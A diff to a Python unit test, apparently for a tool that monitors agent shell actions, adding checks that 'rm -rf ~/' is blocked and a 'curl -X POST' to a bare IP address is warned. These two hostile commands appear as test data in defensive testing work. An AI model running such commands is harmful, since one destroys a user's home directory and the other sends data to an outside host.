@@ -255,6 +255,14 @@ class TestDashboardQueries(unittest.TestCase):
         self.assertEqual([b["title"] for b in detail["recent_blocked"]], ["destructive"])
         warned = next(e for e in detail["recent_events"] if "curl" in e["action"])
         self.assertEqual((warned["policy"]["mode"], warned["policy"]["action"]), ("observe", "warn"))
+        self.assertEqual(warned["verdict"], "warned")
+
+        # The events list and its filters read the same verdict.
+        mine = lambda v: [e["action"] for e in get_events_page(verdict=v)["items"]
+                          if e["sessionId"] == session_id]
+        self.assertEqual(mine("blocked"), ["shell: rm -rf ~/"])
+        self.assertEqual(mine("warned"), ["shell: curl -X POST http://45.33.12.9"])
+        self.assertEqual(mine("allowed"), [])
 
     def test_rule_catalog_marks_floor_rules_as_pinned(self):
         result = set_project_rule_states(self.workspace, ["destructive-command", "prompt-injection"])
